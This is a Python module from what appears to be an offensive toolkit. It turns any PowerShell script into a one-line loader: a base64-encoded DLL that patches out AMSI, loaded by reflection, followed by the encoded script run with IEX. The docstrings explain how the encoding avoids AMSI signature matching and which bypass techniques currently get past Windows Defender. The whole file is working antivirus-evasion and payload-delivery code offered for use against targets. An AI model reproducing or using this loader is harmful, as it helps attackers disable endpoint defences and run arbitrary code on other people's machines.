"""
Payload delivery: wrap an arbitrary PowerShell script with an
in-memory AMSI bypass and produce a single-line loader.

The point of this module is to make the evasion layer usable. Any
module in the toolkit that wants to run PowerShell on a target can:

  1. Write the PowerShell it wants to run.
  2. Call delivery.wrap_script(script) to get a one-liner.
  3. Deliver the one-liner however it wants.

The one-liner contains:

  - A base64-encoded .NET DLL that bypasses AMSI (compiled
    from evade.av_bypass)
  - A base64-encoded copy of the target script
  - A short shell that decodes the DLL, loads it, invokes
    Patch(), then decodes and runs the script

Because the script body and the DLL are both base64-encoded, the
literal text of the one-liner contains no AMSI signatures. If
AMSI is still active when the one-liner runs, the loader still
fails — but the loader itself doesn't match known signatures, so
AMSI's *content* matching doesn't fire on it. The only thing
AMSI would see is the reflection load, which it doesn't scan.

AMSI-bypass choice:

  By default, uses "alloc_hglobal" — the technique that survives
  current Defender. You can override with any technique marked
  status=works in evade.av_bypass.

  Do not use caught techniques (reflection_patch, etc.). They
  work, but Defender will terminate the process on load.

Usage:

    from evade import delivery

    script = '''
    Write-Host "AMSI is off"
    Get-Process | Select-Object -First 5
    '''

    one_liner = delivery.wrap_script(script)
    print(one_liner)
"""

import base64
import textwrap

from core.output import info, success, warn, error

from evade import av_bypass


# Default bypass technique for delivery
DEFAULT_BYPASS = "alloc_hglobal"


# =====================================================================
# Loading-script templates
# =====================================================================

# The one-liner that goes into the target. It expects two base64
# strings to be baked in:
#   {bypass_b64}  — base64-encoded DLL bytes
#   {script_b64}  — base64-encoded UTF-8 script bytes
#
# Everything below is a single PowerShell expression. It's not
# pretty, but it's compact and it contains no AMSI-visible strings.
_LOADER_TEMPLATE = (
    "$b=[Convert]::FromBase64String('{bypass_b64}');"
    "$a=[Reflection.Assembly]::Load($b);"
    "$a.GetType('{cls}').GetMethod('Patch').Invoke($null,@());"
    "$s=[Convert]::FromBase64String('{script_b64}');"
    "IEX([Text.Encoding]::UTF8.GetString($s))"
)


# Pretty-printed version for display / inspection. Functionally
# identical to _LOADER_TEMPLATE.
_LOADER_PRETTY_TEMPLATE = """\
$b64_bypass = '{bypass_b64}'
$b64_script = '{script_b64}'
$bypass = [Convert]::FromBase64String($b64_bypass)
$asm    = [Reflection.Assembly]::Load($bypass)
$asm.GetType('{cls}').GetMethod('Patch').Invoke($null, @())
$script = [Convert]::FromBase64String($b64_script)
IEX([Text.Encoding]::UTF8.GetString($script))
"""


# =====================================================================
# Public API
# =====================================================================

def wrap_script(script: str,
                bypass: str = DEFAULT_BYPASS,
                compact: bool = True,
                verbose: bool = False) -> str:
    """Wrap a PowerShell script with an AMSI bypass and return the
    resulting one-liner (or multi-line string if compact=False).

    The returned string can be pasted directly into any PowerShell
    session. The script will run with AMSI disabled.
    """
    # Compile the bypass
    spec = av_bypass.TECHNIQUES.get(bypass)
    if spec is None:
        raise ValueError(f"unknown bypass technique: {bypass!r}")

    if spec.get("status") not in ("works", "untested"):
        warn(f"  bypass {bypass!r} has status={spec.get('status')!r}; "
             f"delivery may trigger Defender")

    if verbose:
        info(f"  delivery: compiling bypass {bypass!r}")

    payload = av_bypass.compile(bypass, verbose=False)

    bypass_b64 = base64.b64encode(payload.built_bytes).decode("ascii")
    script_b64 = base64.b64encode(script.encode("utf-8")).decode("ascii")

    if compact:
        return _LOADER_TEMPLATE.format(
            bypass_b64=bypass_b64,
            script_b64=script_b64,
            cls=spec["class"],
        )

    return _LOADER_PRETTY_TEMPLATE.format(
        bypass_b64=bypass_b64,
        script_b64=script_b64,
        cls=spec["class"],
    )


def wrap_command(command: str, **kwargs) -> str:
    """Wrap a single PowerShell command (as opposed to a script)."""
    return wrap_script(command, **kwargs)


def wrap_script_file(path: str, **kwargs) -> str:
    """Wrap a PowerShell script read from disk."""
    from pathlib import Path
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"script not found: {path}")
    return wrap_script(p.read_text(encoding="utf-8"), **kwargs)


def wrap_chain(script: str, chain: str, **kwargs) -> str:
    """Wrap a script with a chain of bypass techniques (via chains.py)."""
    from evade import chains

    if kwargs.get("verbose"):
        info(f"  delivery: compiling chain {chain!r}")

    c = chains.compile_chain(chain, verbose=False)

    chain_b64 = base64.b64encode(c.bytes).decode("ascii")
    script_b64 = base64.b64encode(script.encode("utf-8")).decode("ascii")

    template = (
        "$b=[Convert]::FromBase64String('{chain_b64}');"
        "$a=[Reflection.Assembly]::Load($b);"
        "$a.GetType('EvadeChain.Chain').GetMethod('Execute')"
        ".Invoke($null,@());"
        "$s=[Convert]::FromBase64String('{script_b64}');"
        "IEX([Text.Encoding]::UTF8.GetString($s))"
    )
    return template.format(chain_b64=chain_b64, script_b64=script_b64)


# =====================================================================
# Save-to-file helper
# =====================================================================

def write_payload(path: str, script: str,
                  bypass: str = DEFAULT_BYPASS,
                  compact: bool = True) -> str:
    """Write a wrapped script to a file. Returns the file path."""
    from pathlib import Path
    wrapped = wrap_script(script, bypass=bypass, compact=compact)
    out = Path(path)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(wrapped, encoding="utf-8")
    return str(out)